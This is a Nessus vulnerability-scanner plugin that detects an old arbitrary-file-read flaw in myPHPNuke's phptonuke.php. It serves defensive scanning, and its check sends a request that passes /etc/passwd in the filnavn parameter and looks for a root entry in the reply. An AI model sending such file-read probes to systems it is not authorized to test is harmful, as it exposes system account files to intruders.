#
# (C) Tenable Network Security, Inc.
#

# Status: it was *not* tested against a vulnerable host, and the 
# vulnerability is not confirmed, as far as I know.
#
# Reference:
#
# From:	"Zero-X ScriptKiddy" <zero-x@linuxmail.org>
# To:	bugtraq@securityfocus.com
# Date:	Thu, 17 Oct 2002 05:50:10 +0800
# Subject: phptonuke allows Remote File Retrieving
#



include("compat.inc");

if(description)
{
 script_id(11824);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2002-1913");
 script_bugtraq_id(5982);
 script_osvdb_id(53789);

 script_name(english:"myPHPNuke phptonuke.php filnavn Parameter Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for reading of
arbitrary files." );
 script_set_attribute(attribute:"description", value:
"The version of myPHPNuke installed on the remote host allows anyone to
read arbitrary files by passing the full filename to the 'filnavn'
argument of the 'phptonuke.php' script." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=103480589031537&w=2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:myphpnuke:myphpnuke");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/08/31");
 script_cvs_date("$Date: 2012/09/15 23:39:35 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"Reads file through phptonuke.php");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2012 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

global_var	port;

port = get_http_port(default:80, php: 1);


function check(loc)
{
 local_var	r;

 r = http_send_recv3(method:"GET",item:string(loc, "/phptonuke.php?filnavn=/etc/passwd"), port:port, exit_on_fail: 1);
 if(r[2] =~ "root:.*:0:[01]:.*")
 {
  security_warning(port);
  exit(0);
 }
}




foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
